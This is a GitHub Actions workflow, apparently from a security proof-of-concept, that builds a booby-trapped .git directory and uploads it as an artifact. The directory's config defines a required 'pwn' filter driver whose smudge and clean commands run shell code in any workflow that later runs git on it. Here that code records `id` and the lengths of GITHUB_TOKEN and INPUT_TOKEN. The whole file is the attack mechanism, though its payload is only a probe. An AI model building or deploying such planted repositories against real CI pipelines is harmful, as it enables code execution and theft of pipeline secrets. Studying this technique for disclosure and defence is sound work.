---
name: Producer
on:
  workflow_dispatch:

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Build a plantable .git directory with a filter driver
        run: |
          mkdir -p plant
          cd plant
          git init -q .
          git -c user.email=a@b -c user.name=x commit -q --allow-empty -m planted
          git remote add origin https://github.com/PDFtoMark/gab-poc-gitplant
          git config --local core.attributesFile .git/attrs
          git config --local filter.pwn.smudge 'id>/tmp/smudge.txt; echo TOKENLEN=${#INPUT_TOKEN}>>/tmp/smudge.txt; echo TOKENLEN2=${#GITHUB_TOKEN}>>/tmp/smudge.txt; echo SMUDGE-DONE>>/tmp/smudge.txt'
          git config --local filter.pwn.clean 'id>/tmp/clean.txt'
          git config --local filter.pwn.required true
          printf '* filter=pwn\n' > .git/attrs
          cat .git/config
      - uses: actions/upload-artifact@v4
        with:
          name: plant
          path: plant
          include-hidden-files: true
